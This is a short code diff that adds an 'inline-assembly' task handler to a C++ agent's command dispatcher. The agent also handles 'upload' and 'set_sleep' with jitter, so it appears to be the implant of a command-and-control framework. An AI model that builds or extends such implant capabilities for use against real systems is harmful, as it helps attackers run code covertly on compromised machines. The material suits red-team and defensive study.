@@ -91,6 +91,9 @@ void Agent::executeTask(Task& task) {
 	if (task.command == "upload") {
 		command_output = Upload(task.arguments, task.file);
 	}
+	else if (task.command == "inline-assembly") {
+		command_output = InlineAssembly(task.arguments, task.file);
+	}
 	else if (task.command == "set_sleep") {
 		if (task.arguments.size() < 2) {
 			command_output = "Error: usage: set_sleep <interval_ms> <jitter_ms>";
